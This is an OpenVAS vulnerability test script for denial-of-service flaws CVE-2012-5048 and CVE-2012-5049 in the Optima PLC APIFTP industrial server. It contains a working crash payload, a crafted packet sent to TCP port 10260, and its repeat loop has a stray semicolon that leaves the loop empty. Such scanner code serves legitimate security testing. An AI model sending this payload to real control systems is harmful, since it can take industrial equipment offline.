###############################################################################
# OpenVAS Vulnerability Test
#
# Optima PLC APIFTP Server Denial of Service Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803037");
  script_version("2019-05-20T11:12:48+0000");
  script_cve_id("CVE-2012-5048", "CVE-2012-5049");
  script_bugtraq_id(50658, 55712);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2019-05-20 11:12:48 +0000 (Mon, 20 May 2019)");
  script_tag(name:"creation_date", value:"2012-10-04 17:49:57 +0530 (Thu, 04 Oct 2012)");
  script_name("Optima PLC APIFTP Server Denial of Service Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(10260);

  script_xref(name:"URL", value:"http://secunia.com/advisories/46830");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/optimalog_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-12-271-02.pdf");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-332-03.pdf");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial of service condition.");

  script_tag(name:"affected", value:"Optima PLC APIFTP version 2.14.6 and prior.");

  script_tag(name:"insight", value:"Multiple errors in the APIFTP Server (APIFTPServer.exe) when
  handling certain specially crafted packets sent to TCP port 10260 and be
  exploited to cause a NULL pointer dereference or an infinite loop.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Optima PLC APIFTP Server and is prone to
  multiple denial of service vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

## Default Optima PLC APIFTP server Port
port = 10260;
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

payload = raw_string(0xe8, 0x03, 0x04, 0x00, 0xff,
                     crap(data:raw_string(0x00), length: 400));

send(socket:soc, data: payload);
res = recv(socket:soc, length:300);

if (!res || hexstr(res) !~ "^e803") {
  close(soc);
  exit(0);
}

## Send payload multiple times
for (i=0 ; i< 5; i++);{
  send(socket:soc, data: payload);
}

sleep(7);
close(soc);

soc = open_sock_tcp(port);
if(!soc)
{
  security_message(port);
  exit(0);
}
close(soc);
